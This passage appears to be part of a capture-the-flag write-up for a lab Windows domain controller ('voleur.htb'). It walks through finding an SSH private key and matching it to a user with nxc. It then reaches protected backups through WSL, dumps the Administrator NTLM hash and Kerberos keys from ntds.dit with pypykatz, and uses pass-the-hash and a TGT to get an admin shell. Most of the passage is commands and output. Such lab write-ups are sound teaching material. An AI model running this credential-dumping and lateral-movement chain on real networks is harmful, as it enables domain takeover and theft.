and went to check the `C:\IT\THIRD-LINE support` folder, then found inside a `txt` note, a `ssh` private key and backup folder I couldn't access
```powershell
*Evil-WinRM* PS C:\IT\Third-Line Support> ls


    Directory: C:\IT\Third-Line Support


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         1/30/2025   8:11 AM                Backups
-a----         1/30/2025   8:10 AM           2602 id_rsa
-a----         1/30/2025   8:07 AM            186 Note.txt.txt

*Evil-WinRM* PS C:\IT\Third-Line Support> more Note.txt.txt
Jeremy,

I've had enough of Windows Backup! I've part configured WSL to see if we can utilize any of the backup tools from Linux.

Please see what you can set up.

Thanks,

Admin

*Evil-WinRM* PS C:\IT\Third-Line Support> ls Backups
Access to the path 'C:\IT\Third-Line Support\Backups' is denied.
At line:1 char:1
+ ls Backups
+ ~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (C:\IT\Third-Line Support\Backups:String) [Get-ChildItem], UnauthorizedAccessException
    + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand
```

I grabbed the `ssh` private key, now I just have to figure out which user it belongs to, for that I made a list of potential usernames and used `nxc` to try and use the key with those users, and found that it belonged to `svc_backup` (note that the empty password is for ssh key decryption, not the actual users, it's empty since the key was not encrypted)

```bash
$ ls
id_rsa  users
$ cat users
Administrator
Guest
krbtgt
ryan.naylor
marie.bryant
lacey.miller
svc_ldap
svc_backup
svc_iis
jeremy.combs
svc_winrm
ryan
marie
lacey
jeremy
root
admin
$ nxc ssh voleur.htb -u users -p '' --key-file id_rsa --port 2222
SSH         10.10.11.76     2222   voleur.htb       [*] SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.11
SSH         10.10.11.76     2222   voleur.htb       [-] Administrator: Could not decrypt private key, invalid password
SSH         10.10.11.76     2222   voleur.htb       [-] Guest: Could not decrypt private key, invalid password
SSH         10.10.11.76     2222   voleur.htb       [-] krbtgt: Could not decrypt private key, invalid password
SSH         10.10.11.76     2222   voleur.htb       [-] ryan.naylor: Could not decrypt private key, invalid password
SSH         10.10.11.76     2222   voleur.htb       [-] marie.bryant: Could not decrypt private key, invalid password
SSH         10.10.11.76     2222   voleur.htb       [-] lacey.miller: Could not decrypt private key, invalid password
SSH         10.10.11.76     2222   voleur.htb       [-] svc_ldap: Could not decrypt private key, invalid password
SSH         10.10.11.76     2222   voleur.htb       [+] svc_backup: (keyfile: id_rsa) (Pwn3d!) Linux - Shell access!
```

I logged in via `ssh` and found that my user can execute any command as `root` but I didn't need to abuse that
```bash
$ ssh svc_backup@voleur.htb -i id_rsa  -p 2222
svc_backup@DC:~$ sudo -l
Matching Defaults entries for svc_backup on DC:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User svc_backup may run the following commands on DC:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: ALL
```

looking around I found `C:\` mounted under `/mnt/c` 
```bash
svc_backup@DC:~$ mount | tail -n 1
C:\ on /mnt/c type drvfs (rw,noatime,uid=1000,gid=1000,case=off)
```

but this time the `Backups` folder was accessible from inside `wsl`, inside that folder I found a backup of the `SECURITY` and `SYSTEM` registry `hives` as well as `ntds.dit` file

```bash
svc_backup@DC:~$ ls /mnt/c/IT/Third-Line\ Support/Backups
'Active Directory'   registry
svc_ba p@DC:~$ ls /mnt/c/IT/Third-Line\ Support/Backups/registry/
SECURITY  SYSTEM
svc_backup@DC:~$ ls /mnt/c/IT/Third-Line\ Support/Backups/Active\ Directory/
ntds.dit  ntds.jfm
```

I used `pypykatz` to parse them and get the `ntlm` hash of `Administrator`

```bash
$ pypykatz parser ntds Active\ Directory/ntds.dit registry/SYSTEM
ntlm:None:Administrator:66048:S-1-5-352321536-4192410602-1717679695-664587685-500:aad3b435b51404eeaad3b435b51404ee:e656e07c56d831611b577b160b259ad2:2025-01-28 21-35
kerberos:None:Administrator:S-1-5-352321536-4192410602-1717679695-664587685-500:aes256-cts-hmac-sha1-96:f577668d58955ab962be9a489c032f06d84f3b66cc05de37716cac917acbeebb
kerberos:None:Administrator:S-1-5-352321536-4192410602-1717679695-664587685-500:aes128-cts-hmac-sha1-96:38af4c8667c90d19b286c7af861b10cc
kerberos:None:Administrator:S-1-5-352321536-4192410602-1717679695-664587685-500:des-cbc-md5:459d836b9edcd6b0
...
```

```bash
$ nxc ldap voleur.htb -u Administrator -H e656e07c56d831611b577b160b259ad2 -k
LDAP        voleur.htb      389    DC               [*] None (name:DC) (domain:voleur.htb) (signing:None) (channel binding:No TLS cert) (NTLM:False)
LDAP        voleur.htb      389    DC               [+] voleur.htb\Administrator:e656e07c56d831611b577b160b259ad2 (Pwn3d!)
```

I grabbed a `TGT` as administrator, then used it to get another `winrm` shell

```bash
$ getTGT.py voleur.htb/Administrator -hashes :e656e07c56d831611b577b160b259ad2

[*] Saving ticket in Administrator.ccache
```

```bash
$ KRB5_CONFIG=custom_krb5.conf KRB5CCNAME=Administrator.ccache evil-winrm -i dc.voleur.htb -r voleur.htb

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cat ../Desktop/root.txt
f2****************************c3
```
